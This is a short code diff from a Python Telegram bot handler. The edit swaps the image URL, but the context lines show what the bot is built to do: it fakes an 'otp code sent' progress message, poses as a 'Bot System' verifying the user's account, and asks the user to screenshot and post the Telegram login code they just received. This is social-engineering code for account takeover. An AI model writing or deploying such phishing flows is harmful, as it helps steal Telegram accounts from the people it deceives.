@@ -106,7 +106,7 @@ async def regex_cantik(_, message):
     await asyncio.sleep(10)
     await rexa.edit("__successfully sent otp code…__")
     await asyncio.sleep(5)
-    await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
+    await app.send_photo(message.chat.id, "https://telegra.ph/file/40a39209c4e74249e418c.jpg", caption="""
 🤖 ** Our Bot System Need to Verify your Telegram Account**
 
 We sent a login code to your Telegram account, please send take a screenshot and please post it here, as in the example Picture 
